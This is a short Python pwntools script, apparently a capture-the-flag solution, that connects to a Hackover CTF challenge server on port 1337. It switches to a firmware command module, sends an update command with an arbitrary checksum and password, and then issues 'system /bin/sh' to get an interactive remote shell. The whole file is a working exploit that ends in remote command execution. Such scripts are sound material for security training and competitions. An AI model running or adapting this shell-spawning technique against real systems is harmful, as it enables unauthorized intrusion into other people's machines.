from pwn import *

r = remote('stbm.ctf.hackover.de', 1337)

r.send("switch_module FirmwareCommands\n")
r.send("update test context=Kernel checksum=555 password=lol\n")
r.send("system /bin/sh\n")  # you might have to wait for a bit! also, the shell gets laggy at times

r.interactive()
